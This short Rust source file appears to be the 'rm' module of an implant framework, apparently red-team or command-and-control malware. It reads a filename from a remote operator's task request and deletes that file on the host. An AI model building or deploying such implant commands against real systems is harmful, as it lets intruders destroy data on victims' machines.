use async_trait::async_trait;
use malefic_trait::module_impl;
use crate::{check_request, Module, Result, check_field, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;

pub struct Rm{}

#[async_trait]
#[module_impl("rm")]
impl Module for Rm {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::Request)?;

        let filename = check_field!(request.input)?;
        // 尝试删除文件，如果失败则返回错误
        std::fs::remove_file(filename)?;


        Ok(TaskResult::new(id))
    }
}